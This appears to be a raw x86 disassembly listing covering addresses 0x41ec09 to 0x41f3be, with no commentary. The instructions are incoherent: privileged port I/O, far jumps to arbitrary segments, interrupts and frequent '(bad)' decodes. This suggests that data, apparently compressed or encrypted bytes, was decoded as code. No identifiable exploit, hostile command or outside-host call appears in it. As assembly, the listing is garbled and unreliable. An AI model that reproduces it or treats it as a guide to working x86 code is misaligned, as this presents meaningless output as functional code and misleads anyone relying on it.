  41ec09:	lds    edx,FWORD PTR [ebp+0xaa1bbec]
  41ec0f:	out    0xdf,eax
  41ec11:	sub    al,0x17
  41ec13:	stos   BYTE PTR es:[edi],al
  41ec14:	cdq    
  41ec15:	mov    ebp,0xad86c119
  41ec1a:	aad    0x8c
  41ec1c:	pop    edi
  41ec1d:	sbb    BYTE PTR [eax-0x3e110022],bh
  41ec23:	daa    
  41ec24:	aaa    
  41ec25:	mov    al,ds:0xba4182ef
  41ec2a:	sbb    DWORD PTR [eax+0x194cc79c],0x198ed95a
  41ec34:	and    DWORD PTR [edi+0x5c],ebx
  41ec37:	fild   DWORD PTR [esi]
  41ec39:	out    0x27,eax
  41ec3b:	test   al,0x8e
  41ec3d:	sbb    esp,ebx
  41ec3f:	sbb    ch,BYTE PTR [edi-0x43455563]
  41ec45:	(bad)  
  41ec47:	push   eax
  41ec48:	dec    esp
  41ec49:	pushf  
  41ec4a:	mov    edx,0x7ff06a8c
  41ec4f:	mov    BYTE PTR [edx],dl
  41ec51:	in     eax,dx
  41ec52:	out    dx,eax
  41ec53:	adc    al,BYTE PTR ds:0x55f63e95
  41ec59:	mov    esp,0x650e4f9d
  41ec5e:	add    al,0xf3
  41ec60:	mov    ds:0x2aeaaefe,al
  41ec65:	fst    DWORD PTR [esp+eax*8-0x2c9b8cb4]
  41ec6c:	push   ds
  41ec6d:	cld    
  41ec6e:	mov    bl,0xce
  41ec70:	pop    es
  41ec71:	push   cs
  41ec72:	iret   
  41ec73:	fst    DWORD PTR [esi+0x4b8796c9]
  41ec79:	xchg   ah,dl
  41ec7b:	clc    
  41ec7c:	add    al,0xd1
  41ec7e:	or     DWORD PTR [edi+0x40],ebp
  41ec81:	and    eax,0xc8e67914
  41ec86:	popf   
  41ec87:	hlt    
  41ec88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec89:	rol    DWORD PTR ds:0xbcd542a9,0x91
  41ec90:	pop    DWORD PTR [edx]
  41ec92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec93:	jae    0x41ec26
  41ec95:	in     eax,0x77
  41ec97:	mov    ecx,0xeb1aebd1
  41ec9c:	stc    
  41ec9d:	xor    DWORD PTR [ecx],eax
  41ec9f:	stos   DWORD PTR es:[edi],eax
  41eca0:	call   0xdb6d7c9
  41eca5:	jne    0x41ec70
  41eca7:	mov    bh,0xd7
  41eca9:	(bad)  
  41ecaa:	sbb    eax,ecx
  41ecac:	test   eax,0x1779440d
  41ecb1:	pop    esi
  41ecb2:	sub    bh,BYTE PTR [edx+0x2d539758]
  41ecb8:	mov    dh,0xf1
  41ecba:	sbb    esp,DWORD PTR [esi+0x71]
  41ecbd:	cmp    DWORD PTR [eax+0x0],esp
  41ecc0:	enter  0xb2ac,0x15
  41ecc4:	stc    
  41ecc5:	ins    DWORD PTR es:[edi],dx
  41ecc6:	inc    edi
  41ecc7:	pusha  
  41ecc8:	xor    BYTE PTR [ecx-0x4ce682ca],dl
  41ecce:	add    bh,BYTE PTR [eax]
  41ecd0:	mov    BYTE PTR [edx],ah
  41ecd2:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41ecd4:	mov    bl,cl
  41ecd6:	adc    DWORD PTR [eax],0x7d
  41ecd9:	adc    eax,0x67527c6f
  41ecde:	ins    BYTE PTR es:[edi],dx
  41ecdf:	mov    bl,BYTE PTR [esi-0x6436ec77]
  41ece5:	add    ch,BYTE PTR [eax]
  41ece7:	shl    DWORD PTR [ecx+esi*8],0xf4
  41eceb:	jmp    0x5a2:0xd054638b
  41ecf2:	push   es
  41ecf3:	call   0x5812:0x119d74b7
  41ecfa:	in     al,dx
  41ecfb:	sbb    DWORD PTR [ebx-0x7b46a6f7],0xffffffd0
  41ed02:	es stc 
  41ed04:	sbb    al,0xf4
  41ed06:	in     eax,0x3d
  41ed08:	test   al,0xc7
  41ed0a:	mov    edx,0xa7ab4dbe
  41ed0f:	dec    esp
  41ed10:	rcr    BYTE PTR [ebx],1
  41ed12:	add    ecx,edi
  41ed14:	cmp    BYTE PTR [esi],ah
  41ed16:	push   eax
  41ed17:	pop    eax
  41ed18:	pop    edx
  41ed19:	or     ebx,edx
  41ed1b:	adc    dl,BYTE PTR [ecx-0x1d7071ea]
  41ed21:	mov    ds:0x4b7a5ec7,eax
  41ed26:	frstor [ebx-0x7fc0c816]
  41ed2c:	dec    ebx
  41ed2d:	imul   ecx,DWORD PTR [ebx+0x7a],0xb1ecadff
  41ed34:	xchg   ebp,eax
  41ed35:	lock inc edi
  41ed37:	jbe    0x41ed7b
  41ed39:	jmp    0x41ed87
  41ed3b:	adc    esp,ecx
  41ed3d:	lahf   
  41ed3e:	outs   dx,DWORD PTR ds:[esi]
  41ed3f:	or     DWORD PTR [ebp-0x79cc61e2],esp
  41ed45:	inc    ebp
  41ed46:	aam    0xe7
  41ed48:	inc    ecx
  41ed49:	lods   al,BYTE PTR ds:[esi]
  41ed4a:	sub    bl,BYTE PTR ds:0x2485e1cb
  41ed50:	cs and edi,edi
  41ed53:	lods   eax,DWORD PTR ds:[esi]
  41ed54:	sbb    ebx,edi
  41ed56:	or     eax,0xfd5b659b
  41ed5b:	neg    DWORD PTR [eax+0x2e57c7f0]
  41ed61:	sub    dl,BYTE PTR [edi-0x4a0144b9]
  41ed67:	dec    ecx
  41ed68:	ds mov esp,0x129234b
  41ed6e:	adc    eax,0x2c9f42e3
  41ed73:	pusha  
  41ed74:	mov    eax,0xcc52ed5d
  41ed79:	test   al,0x87
  41ed7b:	mov    edx,0x9b274049
  41ed80:	adc    al,BYTE PTR [edi+0x7b]
  41ed83:	fdivrp st(6),st
  41ed85:	lods   al,BYTE PTR ds:[esi]
  41ed86:	retf   0x543e
  41ed89:	cmp    DWORD PTR ds:0x16a5662d,0xffffff91
  41ed90:	ficom  WORD PTR [ebp-0x4c]
  41ed93:	pop    ebx
  41ed94:	xchg   edi,eax
  41ed95:	les    edx,FWORD PTR ss:[edx]
  41ed98:	mov    ebx,0xd9639041
  41ed9d:	inc    ebx
  41ed9e:	push   ecx
  41ed9f:	jne    0x41ed96
  41eda1:	inc    esp
  41eda2:	cmp    BYTE PTR [edx+0x8],0x23
  41eda6:	sar    BYTE PTR [esi+ecx*4+0x47],1
  41edaa:	adc    eax,0x3ee2f1c5
  41edaf:	test   eax,0x475d8a7d
  41edb4:	adc    DWORD PTR ds:0xe0e76c95,0xd764a16a
  41edbe:	jmp    0x8e69e97e
  41edc3:	loopne 0x41ed91
  41edc5:	or     dl,BYTE PTR ds:0x1947a9ae
  41edcb:	imul   BYTE PTR [ebp-0x4e53cf57]
  41edd1:	dec    esi
  41edd2:	dec    ebp
  41edd3:	inc    esp
  41edd4:	jg     0x41ee02
  41edd6:	jbe    0x41ed74
  41edd8:	inc    ecx
  41edd9:	ret    0xde1c
  41eddc:	jge    0x41edbe
  41edde:	cs fucom st(6)
  41ede1:	fs dec edx
  41ede3:	and    esp,DWORD PTR [ebx-0x45]
  41ede6:	sub    BYTE PTR [eax+0x24],al
  41ede9:	xor    dh,ch
  41edeb:	call   0x6f0:0x6302bab8
  41edf2:	ftst   
  41edf4:	loope  0x41ee04
  41edf6:	das    
  41edf7:	add    al,0xe6
  41edf9:	fsubp  st(2),st
  41edfb:	add    al,0x18
  41edfd:	enter  0xdb49,0x90
  41ee01:	test   DWORD PTR [ecx],ebx
  41ee03:	push   0x57dedee8
  41ee08:	xchg   edx,eax
  41ee09:	sub    BYTE PTR [ecx+ebx*8-0x72],dl
  41ee0d:	and    eax,0x56274451
  41ee12:	mov    ds:0x391ea8bf,eax
  41ee17:	scas   eax,DWORD PTR es:[edi]
  41ee18:	or     eax,0x8b5f3a10
  41ee1d:	jle    0x41ee34
  41ee1f:	jecxz  0x41ee7a
  41ee21:	inc    esi
  41ee22:	mov    esp,0x7120875a
  41ee27:	add    esp,ebx
  41ee29:	dec    ecx
  41ee2a:	sti    
  41ee2b:	inc    esi
  41ee2c:	sub    edi,DWORD PTR [edi-0x33]
  41ee2f:	jp     0x41ee0f
  41ee31:	sbb    BYTE PTR [eax-0x47],dh
  41ee34:	pop    ds
  41ee35:	push   edx
  41ee36:	mov    al,0x2c
  41ee38:	cmp    al,0x20
  41ee3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee3b:	scas   al,BYTE PTR es:[edi]
  41ee3c:	es pop ecx
  41ee3e:	jmp    0xf8d7:0x603669b
  41ee45:	mov    edx,0xcf41c5fd
  41ee4a:	rcl    DWORD PTR [edx],cl
  41ee4c:	cdq    
  41ee4d:	pop    eax
  41ee4e:	jb     0x41edfb
  41ee50:	pop    edi
  41ee51:	cmp    DWORD PTR [ecx+0x2d018ad0],0xbbe6469a
  41ee5b:	mov    al,0x31
  41ee5d:	scas   al,BYTE PTR es:[edi]
  41ee5e:	nop
  41ee5f:	iret   
  41ee60:	and    dh,ch
  41ee62:	stc    
  41ee63:	retf   0xd6c4
  41ee66:	mov    ds:0x1efc26a6,eax
  41ee6b:	jnp    0x41eeb8
  41ee6d:	ins    BYTE PTR es:[edi],dx
  41ee6e:	dec    ebp
  41ee6f:	pusha  
  41ee70:	in     eax,0x14
  41ee72:	xor    esp,esp
  41ee74:	add    BYTE PTR [edi+edx*2],al
  41ee77:	lea    edi,[ecx-0x2d]
  41ee7a:	pop    ds
  41ee7b:	aam    0x6b
  41ee7d:	push   esi
  41ee7e:	inc    BYTE PTR [eax]
  41ee80:	jae    0x41ee99
  41ee82:	pushf  
  41ee83:	and    BYTE PTR [edx+0x2f],bh
  41ee86:	xchg   edi,eax
  41ee87:	out    0x7c,al
  41ee89:	outs   dx,BYTE PTR ds:[esi]
  41ee8a:	in     al,0x78
  41ee8c:	and    eax,0xf068bb54
  41ee91:	neg    esi
  41ee93:	push   es
  41ee94:	cmp    al,ah
  41ee96:	addr16 inc ebx
  41ee98:	mov    ecx,DWORD PTR [ebx]
  41ee9a:	enter  0x8299,0x2
  41ee9e:	stos   DWORD PTR es:[edi],eax
  41ee9f:	ret    0x6768
  41eea2:	leave  
  41eea3:	and    bl,dh
  41eea5:	mov    esp,0xc16d5572
  41eeaa:	imul   esp,DWORD PTR [eax+eiz*1-0x4fa6c814],0x13198b9a
  41eeb5:	or     eax,0x2473f3af
  41eeba:	cmp    cl,ah
  41eebc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eebd:	and    DWORD PTR [edi-0x36],0xf1809b05
  41eec4:	sub    eax,0x1c9019c3
  41eec9:	add    eax,0xe01159ab
  41eece:	xlat   BYTE PTR ds:[ebx]
  41eecf:	and    al,0x8f
  41eed1:	mov    ah,0x3a
  41eed3:	push   0x79
  41eed5:	mov    dl,0x24
  41eed7:	pop    ecx
  41eed8:	shl    edx,0x94
  41eedb:	arpl   di,bp
  41eedd:	nop
  41eede:	jne    0x41ee61
  41eee0:	mov    ds:0xbf35425,eax
  41eee5:	xlat   BYTE PTR ds:[ebx]
  41eee6:	lock jl 0x41ef2f
  41eee9:	mov    dh,0xc
  41eeeb:	in     al,dx
  41eeec:	or     edx,DWORD PTR [eax+0x74]
  41eeef:	mov    eax,0xddc691f8
  41eef4:	inc    ch
  41eef6:	fnstcw WORD PTR [ecx]
  41eef8:	mov    esi,0x1abf7f70
  41eefd:	loopne 0x41ef53
  41eeff:	sbb    al,0x9f
  41ef01:	xchg   BYTE PTR [edi+0x78837d8b],ah
  41ef07:	and    BYTE PTR [eax],0x2b
  41ef0a:	mov    cl,al
  41ef0c:	cwde   
  41ef0d:	xor    ecx,edx
  41ef0f:	mov    eax,0xead8170d
  41ef14:	jne    0x41ef58
  41ef16:	xor    al,0x10
  41ef18:	and    BYTE PTR [edi],bh
  41ef1a:	add    BYTE PTR [ebx+ebx*2-0x61],cl
  41ef1e:	push   edx
  41ef1f:	dec    edi
  41ef20:	test   ebx,eax
  41ef22:	cwde   
  41ef23:	dec    edx
  41ef24:	mov    al,ds:0x8ff762a8
  41ef29:	lahf   
  41ef2a:	adc    ch,BYTE PTR [ecx+esi*8+0x4d]
  41ef2e:	push   ss
  41ef2f:	xor    al,bl
  41ef31:	out    0x65,eax
  41ef33:	out    dx,al
  41ef34:	pop    eax
  41ef35:	and    ah,BYTE PTR [ecx-0x277d7c02]
  41ef3b:	jmp    0x8700:0xe0244be0
  41ef42:	adc    eax,0x1f6ae4d8
  41ef47:	frstor [edi]
  41ef49:	ja     0x41ef87
  41ef4b:	in     al,0xa0
  41ef4d:	stos   BYTE PTR es:[edi],al
  41ef4e:	inc    esp
  41ef4f:	pop    esp
  41ef50:	sub    bh,BYTE PTR [ebx+edi*4-0x77e18e04]
  41ef57:	add    BYTE PTR [ecx-0x51],0x75
  41ef5b:	cmc    
  41ef5c:	gs inc ebx
  41ef5e:	retf   0x2246
  41ef61:	mov    BYTE PTR [ebx-0x43e39eca],bl
  41ef67:	fimul  WORD PTR [edx-0x77f04661]
  41ef6d:	jno    0x41ef37
  41ef6f:	aad    0x79
  41ef71:	mov    ecx,0x20d568dd
  41ef76:	and    eax,0x1bc3c50a
  41ef7b:	push   ds
  41ef7c:	lds    esp,FWORD PTR [ebp+0x5b]
  41ef7f:	push   0x71
  41ef81:	push   esp
  41ef82:	js     0x41ef99
  41ef84:	push   ss
  41ef85:	inc    ebx
  41ef86:	call   0xa9b0:0x48571162
  41ef8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef8e:	dec    esp
  41ef8f:	dec    ebp
  41ef90:	mov    cs,WORD PTR [ebp+0xc]
  41ef93:	in     eax,dx
  41ef94:	pop    ds
  41ef95:	adc    bl,bh
  41ef97:	test   ebp,ebx
  41ef99:	adc    ch,dh
  41ef9b:	aam    0x95
  41ef9d:	push   edx
  41ef9e:	pop    esi
  41ef9f:	mov    ah,0x9d
  41efa1:	ja     0x41ef46
  41efa3:	push   esp
  41efa4:	mov    DWORD PTR [edi],esi
  41efa6:	add    bl,BYTE PTR [edx+ebp*8+0x65]
  41efaa:	or     DWORD PTR [edi+0x4ff4fb3a],0x995fde27
  41efb4:	mov    ?,WORD PTR [edi+0x3d]
  41efb7:	mov    ebp,0xf2aa3ff2
  41efbc:	sub    eax,0x78af71d9
  41efc1:	sahf   
  41efc2:	cmp    ecx,DWORD PTR [ecx+eiz*1+0x6009319a]
  41efc9:	add    BYTE PTR [ebp-0x56c01675],cl
  41efcf:	xchg   esi,eax
  41efd0:	inc    eax
  41efd1:	das    
  41efd2:	add    esp,eax
  41efd4:	add    bh,ah
  41efd6:	mov    BYTE PTR [edx+0x1c],bh
  41efd9:	inc    edi
  41efda:	pop    eax
  41efdb:	jp     0x41efc1
  41efdd:	xor    al,0xd
  41efdf:	and    eax,ecx
  41efe1:	test   eax,0x319126ab
  41efe6:	call   0x6f8aa1de
  41efeb:	fisubr DWORD PTR [ecx+0x4a]
  41efee:	lea    edx,[esi]
  41eff0:	mov    esi,DWORD PTR [ecx]
  41eff2:	pmaddwd mm6,QWORD PTR [ebp+0x27]
  41eff6:	mov    edi,0x5c90b6c0
  41effb:	cmp    eax,DWORD PTR ds:0xa8c389bf
  41f001:	fsubr  QWORD PTR gs:[esi]
  41f004:	jnp    0x41ef99
  41f006:	aam    0xc2
  41f008:	leave  
  41f009:	cmp    eax,0x24b1bf5b
  41f00e:	jge    0x41f078
  41f010:	jb     0x41efbd
  41f012:	retf   
  41f013:	xor    DWORD PTR [edx-0x6f],esi
  41f016:	mov    edi,0x267b1b97
  41f01b:	mov    ds:0x547ccb1f,al
  41f020:	js     0x41f03f
  41f022:	dec    ecx
  41f023:	in     eax,dx
  41f024:	(bad)  
  41f025:	ja     0x41eff7
  41f027:	arpl   WORD PTR [edx],dx
  41f029:	mov    ds:0xe1dbda7d,al
  41f02e:	neg    ch
  41f030:	push   ds
  41f031:	push   ebx
  41f032:	push   edi
  41f033:	(bad)  
  41f034:	cld    
  41f035:	mov    DWORD PTR ds:0x56b10b6a,ebx
  41f03b:	mov    ds:0x4c6baef9,eax
  41f040:	mov    edx,0x6a39266d
  41f045:	ins    DWORD PTR es:[edi],dx
  41f046:	add    al,0x75
  41f048:	pop    ss
  41f049:	mov    ds:0x107654aa,al
  41f04e:	pop    esi
  41f04f:	test   ch,dl
  41f051:	mov    esp,DWORD PTR [ecx]
  41f053:	addr16 (bad) 
  41f055:	aas    
  41f056:	dec    esp
  41f057:	and    BYTE PTR [esp+esi*1-0x4255d6d],bl
  41f05e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f05f:	jmp    0x7855:0xbcb6d63
  41f066:	push   ecx
  41f067:	test   ch,al
  41f069:	out    0xa6,al
  41f06b:	fisttp DWORD PTR [ebx+ecx*1+0x10]
  41f06f:	pop    esi
  41f070:	iret   
  41f071:	ret    0x398d
  41f074:	scas   al,BYTE PTR es:[edi]
  41f075:	cmp    esi,DWORD PTR [edi-0x7e5baa1f]
  41f07b:	stos   BYTE PTR es:[edi],al
  41f07c:	outs   dx,BYTE PTR ds:[esi]
  41f07d:	cmp    esp,DWORD PTR [eax]
  41f07f:	xchg   edi,eax
  41f080:	inc    edx
  41f081:	or     edx,eax
  41f083:	ss push ebx
  41f085:	fimul  DWORD PTR ss:[edx]
  41f088:	clc    
  41f089:	pusha  
  41f08a:	fdivr  QWORD PTR [edi+0x5153e3f7]
  41f090:	retf   0x73a1
  41f093:	mov    ebx,0x8c284feb
  41f098:	sbb    DWORD PTR [edx+0x68efaf79],ebp
  41f09e:	pop    ebx
  41f09f:	nop
  41f0a0:	imul   ebx,edi,0x76
  41f0a3:	xlat   BYTE PTR ds:[ebx]
  41f0a4:	mov    edx,0x4ac567fc
  41f0a9:	jle    0x41f0c7
  41f0ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0ac:	int3   
  41f0ad:	and    DWORD PTR [edi-0x3eaf845a],ebp
  41f0b3:	nop
  41f0b4:	add    al,0x23
  41f0b6:	xchg   ebp,eax
  41f0b7:	cli    
  41f0b8:	jmp    0xa319:0xdea8b811
  41f0bf:	push   0x5e
  41f0c1:	dec    esi
  41f0c2:	mov    bl,0xb7
  41f0c4:	or     BYTE PTR [esi],ch
  41f0c6:	into   
  41f0c7:	leave  
  41f0c8:	fidiv  WORD PTR [ecx]
  41f0ca:	repz pop ebp
  41f0cc:	int3   
  41f0cd:	mov    ecx,0xf5b21e71
  41f0d2:	cmp    esi,DWORD PTR [esi+0x6a]
  41f0d5:	mov    ebp,0x214020d6
  41f0da:	mov    edx,0x39aaa69b
  41f0df:	scas   eax,DWORD PTR es:[edi]
  41f0e0:	call   0x6474bd49
  41f0e5:	ja     0x41f104
  41f0e7:	int    0x42
  41f0e9:	pop    eax
  41f0ea:	sbb    esp,DWORD PTR [edx+0x17]
  41f0ed:	in     eax,0x2d
  41f0ef:	(bad)  
  41f0f0:	cli    
  41f0f1:	pop    ss
  41f0f2:	out    dx,eax
  41f0f3:	pop    ss
  41f0f4:	pop    edx
  41f0f5:	jnp    0x41f0ce
  41f0f7:	xor    esp,DWORD PTR [ecx-0x72]
  41f0fa:	dec    ebp
  41f0fb:	cmc    
  41f0fc:	in     eax,dx
  41f0fd:	xor    al,0xfd
  41f0ff:	inc    ebp
  41f100:	jb     0x41f0f2
  41f102:	add    esi,edi
  41f104:	popf   
  41f105:	sahf   
  41f106:	xchg   edi,eax
  41f107:	div    BYTE PTR [ebp-0x6ad6ad25]
  41f10d:	ins    BYTE PTR es:[edi],dx
  41f10e:	out    0x8b,al
  41f110:	mov    edi,0x700db8f0
  41f115:	dec    esi
  41f116:	ss pop es
  41f118:	add    dl,BYTE PTR [ebp-0x27a7bbee]
  41f11e:	out    0x3f,eax
  41f120:	call   DWORD PTR [ebx+eax*8-0x40970795]
  41f127:	cs jecxz 0x41f0fa
  41f12a:	in     al,0x3
  41f12c:	fimul  DWORD PTR [ebx-0x519662f9]
  41f132:	xor    DWORD PTR [edx+edx*2],0x57239827
  41f139:	ror    DWORD PTR [esi+0x7c24fd99],1
  41f13f:	aaa    
  41f140:	and    esp,edi
  41f142:	mov    ecx,0x68706852
  41f147:	dec    edx
  41f148:	mov    ebp,0xbe4993f4
  41f14d:	inc    esp
  41f14e:	inc    ecx
  41f14f:	dec    ebp
  41f150:	repnz xlat BYTE PTR ds:[ebx]
  41f152:	into   
  41f153:	cmp    al,0xc
  41f155:	shr    DWORD PTR [esi],cl
  41f157:	in     al,0xbb
  41f159:	clc    
  41f15a:	cdq    
  41f15b:	es add eax,0x2b3c9965
  41f161:	ror    BYTE PTR [edi+0x1c79a48b],0x79
  41f168:	jb     0x41f11a
  41f16a:	cmp    BYTE PTR [ebp+0x54304a46],ah
  41f170:	scas   eax,DWORD PTR es:[edi]
  41f171:	mov    edx,0x3d9e9747
  41f176:	and    ecx,DWORD PTR ds:0x34f3268f
  41f17c:	loop   0x41f19e
  41f17e:	enter  0x4aac,0xcd
  41f182:	into   
  41f183:	mov    esp,0xaddb1d1e
  41f188:	and    DWORD PTR [edi-0x3b],0x33a3450a
  41f18f:	pop    eax
  41f190:	sbb    edx,edx
  41f192:	(bad)  
  41f193:	dec    edx
  41f194:	std    
  41f195:	mov    ecx,0x53c3f96c
  41f19a:	jle    0x41f1e3
  41f19c:	outs   dx,BYTE PTR ds:[esi]
  41f19d:	retfw  
  41f19f:	dec    ecx
  41f1a0:	push   ebx
  41f1a1:	xchg   ecx,eax
  41f1a2:	stc    
  41f1a3:	leave  
  41f1a4:	add    cl,BYTE PTR [edx]
  41f1a6:	pop    ebx
  41f1a7:	push   ds
  41f1a8:	pop    esi
  41f1a9:	dec    ecx
  41f1aa:	cmp    eax,0x7d684834
  41f1af:	test   BYTE PTR [esi+0x2b],0xc9
  41f1b3:	das    
  41f1b4:	xchg   ecx,eax
  41f1b5:	ds jb  0x41f149
  41f1b8:	pushf  
  41f1b9:	and    DWORD PTR [ebx+0x689bf09e],ebx
  41f1bf:	cmp    ax,0x9554
  41f1c3:	jne    0x41f193
  41f1c5:	pop    ecx
  41f1c6:	inc    esp
  41f1c7:	or     edi,esi
  41f1c9:	shl    edx,1
  41f1cb:	int    0x53
  41f1cd:	jbe    0x41f184
  41f1cf:	arpl   WORD PTR [ecx+0x58],si
  41f1d2:	push   ss
  41f1d3:	sub    BYTE PTR [ecx-0x7d],0xb1
  41f1d7:	push   esi
  41f1d8:	push   ebx
  41f1d9:	mov    ds:0xc7b6ae48,al
  41f1de:	loop   0x41f20c
  41f1e0:	fs dec edx
  41f1e2:	(bad)  
  41f1e3:	aas    
  41f1e4:	mov    esi,0x2e484b53
  41f1e9:	ror    DWORD PTR ds:0xa1bb61b0,1
  41f1ef:	inc    eax
  41f1f0:	jnp    0x41f213
  41f1f2:	pop    ebx
  41f1f3:	jae    0x41f19a
  41f1f5:	or     ch,BYTE PTR [edx-0x1976a24e]
  41f1fb:	sbb    eax,0x89dffba
  41f200:	imul   ecx,DWORD PTR [edx+0x3],0xffffffa1
  41f204:	add    BYTE PTR [edi],bl
  41f206:	inc    ebx
  41f207:	mov    ds:0x8f6aaeb7,al
  41f20c:	mov    bh,0x40
  41f20e:	jne    0x41f1ee
  41f210:	and    al,0x6e
  41f212:	push   ss
  41f213:	cmp    esi,eax
  41f215:	jae    0x41f1f9
  41f217:	aad    0x2e
  41f219:	cld    
  41f21a:	data16 jns 0x41f1cc
  41f21d:	jg     0x41f1af
  41f21f:	sub    BYTE PTR [ebx-0x13bc8801],dl
  41f225:	or     ecx,DWORD PTR [ebp-0x2c]
  41f228:	stc    
  41f229:	or     bh,BYTE PTR [eax]
  41f22b:	sbb    ecx,DWORD PTR ss:[ecx-0x23]
  41f22f:	pusha  
  41f230:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f231:	pop    edx
  41f232:	cld    
  41f233:	loopne 0x41f1c1
  41f235:	dec    ecx
  41f236:	lahf   
  41f237:	aam    0x0
  41f239:	cmp    DWORD PTR [eax],ebp
  41f23b:	mov    bl,0x54
  41f23d:	lock add eax,0xa1a30782
  41f243:	cmp    eax,0x22f15ce1
  41f248:	jae    0x41f2b0
  41f24a:	in     eax,0x2a
  41f24c:	adc    al,0x4f
  41f24e:	xchg   BYTE PTR [esi-0x402bafa1],cl
  41f254:	jns    0x41f2c3
  41f256:	jmp    0x6c33067f
  41f25b:	jmp    0x41f28a
  41f25d:	test   al,0x7f
  41f25f:	jecxz  0x41f26c
  41f261:	ds pop ss
  41f263:	sbb    al,0xa4
  41f265:	int    0x60
  41f267:	outs   dx,DWORD PTR ds:[esi]
  41f268:	adc    eax,0xe3896082
  41f26d:	sbb    ebx,edi
  41f26f:	sub    DWORD PTR [edi-0x46ab1c91],edx
  41f275:	sahf   
  41f276:	xor    esp,DWORD PTR [edx+0x6447da37]
  41f27c:	aad    0x21
  41f27e:	ret    0x86fc
  41f281:	xchg   ebp,eax
  41f282:	inc    esi
  41f283:	leave  
  41f284:	ffreep st(5)
  41f286:	inc    ecx
  41f287:	xchg   esi,eax
  41f288:	iret   
  41f289:	int    0x29
  41f28b:	pop    ebp
  41f28c:	push   ebp
  41f28d:	jno    0x41f2f2
  41f28f:	adc    DWORD PTR [edi+0x9],0x16
  41f293:	jl     0x41f231
  41f295:	xor    eax,0xb8724d55
  41f29a:	popa   
  41f29b:	lock fidiv DWORD PTR [edi+0x39d70db1]
  41f2a2:	aaa    
  41f2a3:	cmp    BYTE PTR [edx],dl
  41f2a5:	aam    0xd9
  41f2a7:	imul   ecx,DWORD PTR [esp+esi*8-0x5bdc7d1e],0x3da386ea
  41f2b2:	xor    esi,DWORD PTR [eax+edi*8-0x70]
  41f2b6:	(bad)  
  41f2b7:	dec    esi
  41f2b8:	and    eax,0x874c83c6
  41f2bd:	jae    0x41f328
  41f2bf:	rol    DWORD PTR [ebx+0xa],cl
  41f2c2:	sbb    DWORD PTR [edx-0x2f],eax
  41f2c5:	xor    ch,BYTE PTR fs:[esi+ebx*2+0x890cecb]
  41f2cd:	sub    esi,DWORD PTR [edx+0x15]
  41f2d0:	push   edx
  41f2d1:	ins    DWORD PTR es:[edi],dx
  41f2d2:	loop   0x41f315
  41f2d4:	aas    
  41f2d5:	sub    edx,DWORD PTR [esp+eiz*8]
  41f2d8:	dec    BYTE PTR [edx-0x3e1ca458]
  41f2de:	pop    esp
  41f2df:	push   dx
  41f2e1:	push   ds
  41f2e2:	ret    
  41f2e3:	jne    0x41f2fc
  41f2e5:	test   eax,0x8fbefec3
  41f2ea:	mov    dh,0x1a
  41f2ec:	mov    al,ds:0xc859780f
  41f2f1:	mov    ch,dl
  41f2f3:	out    0x22,eax
  41f2f5:	or     dh,BYTE PTR [edi-0xd10ac86]
  41f2fb:	xchg   ah,bh
  41f2fd:	and    ecx,0x15fe378
  41f303:	ror    ah,1
  41f305:	push   ecx
  41f306:	out    dx,al
  41f307:	dec    edx
  41f308:	push   0x4f
  41f30a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f30b:	call   0x150:0xf3c10e22
  41f312:	enter  0xde8a,0x37
  41f316:	cmp    DWORD PTR [eax+0x12],ecx
  41f319:	retf   0x9812
  41f31c:	sub    ecx,DWORD PTR [esp+eax*1]
  41f31f:	mov    ds:0x67cb03e0,al
  41f324:	imul   ebp,DWORD PTR [edx],0xd92c22cd
  41f32a:	sub    DWORD PTR [edx-0x23],esp
  41f32d:	xchg   DWORD PTR [eax+ebx*1-0x150fd0cf],ecx
  41f334:	dec    eax
  41f335:	cmc    
  41f336:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f337:	jle    0x41f2ec
  41f339:	in     al,0xfe
  41f33b:	dec    ebx
  41f33c:	mov    bh,dl
  41f33e:	mov    ebp,0x9b9a4edd
  41f343:	or     ebp,esi
  41f345:	ins    BYTE PTR es:[edi],dx
  41f346:	outs   dx,DWORD PTR ds:[esi]
  41f347:	cmp    al,BYTE PTR fs:[esi+0x45]
  41f34b:	cld    
  41f34c:	dec    ebp
  41f34d:	jns    0x41f2e7
  41f34f:	xor    dl,BYTE PTR [esi-0x55]
  41f352:	sbb    ecx,DWORD PTR [eax+0x47]
  41f355:	int    0xf1
  41f357:	call   DWORD PTR [ebp+0x3d]
  41f35a:	xchg   esp,eax
  41f35b:	mov    bl,0x70
  41f35d:	sbb    al,0x1a
  41f35f:	push   ss
  41f360:	neg    DWORD PTR [edi]
  41f362:	and    al,0x53
  41f364:	xor    eax,0x7b272e4c
  41f369:	ja     0x41f37d
  41f36b:	fiadd  DWORD PTR [edx-0x7f77622e]
  41f371:	add    al,0x19
  41f373:	mov    DWORD PTR [eax+0x7388744],ecx
  41f379:	jmp    0x4ef80d60
  41f37e:	ins    BYTE PTR es:[edi],dx
  41f37f:	lods   al,BYTE PTR ds:[esi]
  41f380:	stc    
  41f381:	push   ecx
  41f382:	in     al,0x9b
  41f384:	jecxz  0x41f344
  41f386:	xchg   bl,ch
  41f388:	ret    
  41f389:	(bad)  
  41f38a:	aam    0x6c
  41f38c:	std    
  41f38d:	push   0xe35a6b76
  41f392:	push   eax
  41f393:	and    DWORD PTR [esi],esi
  41f395:	and    BYTE PTR [edx+0x1e5dddd6],dl
  41f39b:	xor    BYTE PTR [edx],bl
  41f39d:	cli    
  41f39e:	mov    dh,0x28
  41f3a0:	cmp    al,0xc
  41f3a2:	and    eax,0xbd463031
  41f3a7:	jae    0x41f3e5
  41f3a9:	dec    esp
  41f3aa:	ror    DWORD PTR [edi+0x20037744],0xbd
  41f3b1:	push   ecx
  41f3b2:	push   ds
  41f3b3:	or     al,0xdf
  41f3b5:	imul   edx,DWORD PTR [eax-0x16],0x4c
  41f3b9:	daa    
  41f3ba:	jle    0x41f3f7
  41f3bc:	xchg   esp,eax
  41f3bd:	push   esi
  41f3be:	(bad)  
